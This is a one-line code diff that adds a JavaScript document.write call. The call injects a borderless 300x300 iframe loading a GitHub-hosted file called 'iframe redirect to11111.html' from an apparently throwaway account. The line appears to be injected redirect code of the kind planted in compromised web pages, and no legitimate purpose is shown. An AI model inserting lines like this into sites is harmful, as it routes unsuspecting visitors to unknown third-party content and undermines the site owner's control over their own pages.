@@ -1,0 +1,1 @@
+document.write('<iframe frameborder="0" scrolling="no" height="300" width="300" name="myFrame" src="https://github.com/tottijbzy1/klm/blob/main/iframe%20redirect%20to11111.html"></iframe>');
